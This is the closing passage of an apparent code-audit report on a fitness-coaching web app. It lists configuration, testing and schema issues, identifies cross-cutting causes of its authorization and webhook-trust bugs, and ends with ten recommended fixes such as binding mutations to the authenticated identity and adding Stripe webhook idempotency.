- **Sentry DSN hardcoded** in 3 files (`sentry.server.config.ts`, `sentry.edge.config.ts`, `instrumentation-client.ts`). Should be `process.env.SENTRY_DSN`.
- **`tracesSampleRate: 1`** in server + edge — 100% trace ingestion, costly at scale.
- **`sendDefaultPii: true`** on Sentry — sends user PII unconditionally; should be `false` or controlled per environment.
- **`.env.example` missing** `STRIPE_SECRET_KEY`, `STRIPE_WEBHOOK_SECRET`, `RESEND_API_KEY`, `CLERK_WEBHOOK_SECRET` — webhook routes refuse to start without these.
- **No CSP header** in `next.config.ts:71-78`. Other OWASP headers present but the most important one is missing.

### 6.6 Test Coverage Gaps

- `convex/__tests__/plans.test.ts` re-implements validation logic inline rather than driving the real Convex mutation. **Tests pass while the real function has the bugs above.** Zero regression coverage.
- `e2e/core-flow.spec.ts` — one spec. No coverage of:
  - Admin user management
  - Suspension / reinstate flow
  - Stripe billing lifecycle
  - Coach plan builder
  - Workout logging end-to-end
  - PR celebration
  - Webhook handlers (Clerk, Stripe)
  - Edge proxy auth gates
- No Vitest coverage on hooks (`use-active-plan`, `use-pr-detection`).
- No Storybook stories for the dialogs that just shipped (`reinstate-user-dialog.tsx`, etc.).

### 6.7 Schema Drift / Latent

- `plans.exercises[]` and `sessions.exercises[]` are still required by the schema validator. New writes set them to `[]`. A migration is overdue.
- `users.status` is `v.optional` — code defaults to `"active"` when missing. Should be set on every insert path.
- `typingIndicators` has `expiresAt` but **no cleanup cron** (and no `archiveOldLogs`-like scheduled task). Rows accumulate forever.
- `auditLogs.archiveOldLogs` exists but is not scheduled.

### 6.8 Webhook & Worker Cleanup

- `public/sw.js:96-106` `sync-mutations` handler is a documented no-op stub. Either implement or remove.
- `sw.js:1-3` — three cache name constants with no single source of version; bumping fails to invalidate (B-080).
- `notification-preferences.tsx:144` reads `Notification.permission` at render time without subscribing to permission changes (B-051 in F audit).

### 6.9 Misc

- `convex/subscriptions.ts:83` comment admits the workaround scan — leave the comment but track the index migration as a real ticket.
- `mission-control.tsx:33-47` `generateErrorRateData()` is `Math.random()` mock data with a "replace with real Sentry API when ready" comment. Either implement or hide the widget.
- `audit-log-viewer.tsx` action color heuristic uses `string.includes("delete")` — false-positive on actions like `"undelete"`. Use an enum mapping instead.
- `chat-input.tsx:68-77` paperclip and emoji icon buttons render but have no `onClick` handlers — visual lies.
- Coach "Add Client" form (`client-form.tsx`) requires raw Clerk IDs — no email invite. Documented in product status; still a real product gap.

---

## Cross-Cutting Themes

1. **Identity is treated as data, not as context.** Almost every IDOR bug stems from the same pattern: a mutation takes `userId` as an arg, the auth helper "checks" it, but never compares it to the authenticated identity. The fix is structural — `userId` should never be a client-supplied arg for ownership-scoped operations. It should be derived inside the handler from `ctx.auth.getUserIdentity()`.

2. **`requireOwnership` is mis-designed.** The "admin/coach bypass" makes sense for a few helper queries (e.g., a coach viewing a client's plan), but it's applied uniformly to mutations like `submitCheckin`, `updateUserStats`, `saveSubscription`. Coaches should NOT have universal write access to all users' data. Split into `canRead` and `canWrite` semantics and enforce coach→client membership explicitly.

3. **Trust models for webhooks are inferred, not declared.** `subscriptions.upsert` and `promoteToCoachFromBilling` are public mutations trusted-by-convention because "only the webhook calls them". Convex doesn't enforce that. The right model is `httpAction` inside Convex with signature verification at the data boundary.

4. **Tests test the wrong thing.** Rewriting validation inline produces a green build with all the real bugs intact. Use `convex-test` or similar to drive the actual registered functions with mocked auth identities.

5. **Type safety is opt-in.** Pervasive `as any` / `as never` / stringly-typed function references defeat the very system that would have caught half these bugs at compile time.

6. **"Ships but unwired" is a recurring pattern.** PR celebration shipped but wasn't called (recently fixed). Sidebar shipped but isn't mounted. Trophy case shipped but isn't displayed. Error rate widget shipped with mock data. Audit filters shipped without query wiring. Validators directory shipped empty. Each piece looks done in isolation; the integration is missing.

7. **Schema lies about reality.** Required fields with empty defaults (`plans.exercises[]`), TTL fields with no cleanup (`typingIndicators.expiresAt`), and indexes defined but never used (`plans.by_clientId_status`).

---

## Recommended Immediate Action Items (Top 10)

These should be fixed before any new feature work or before the next billing-related deployment.

1. **Lock down `promoteToCoachFromBilling`** — convert to `internalMutation`, move webhook into Convex `httpAction`. (BUG-001)
2. **Bind every public mutation/query to `ctx.auth.getUserIdentity()`** — remove client-trust on `userId` / `clientId` / `senderId` everywhere. (BUG-002, 003, 004, 008, 009, 012, 013, 035)
3. **Fix the broken set inputs** — wire `onWeightChange` / `onRepsChange` callbacks. (BUG-024)
4. **Fix `/admin/users` ReferenceError** — rename `handleRoleChange` → `handleRoleFilterChange`. (BUG-023)
5. **Fix Stripe new-customer onboarding** — pass `client_reference_id` at checkout creation; add `by_stripeCustomerId` index. (BUG-005)
6. **Add Stripe webhook idempotency table** keyed by `event.id`. (BUG-022)
7. **Add webhook event-ordering guard** using `event.created`. (BUG-006)
8. **Fix `mapStripeStatus` default fallback** to `"canceled"`. (BUG-007)
9. **Validate `actualWeight` / `actualReps` / `sessionDate`** at write time. (BUG-015, 017, 018)
10. **Delete or auth-gate `plans:list`, `sessions:list`, `progress:list`, `sessions:getByDate`** — they're full-table dumps. (BUG-055, 054)

---

*End of report. Cited bugs total 109 (58 backend + 51 frontend + 0 overlaps; some IDs in §2 reference the consolidated catalog). All file paths and line numbers verified against the codebase at audit time.*
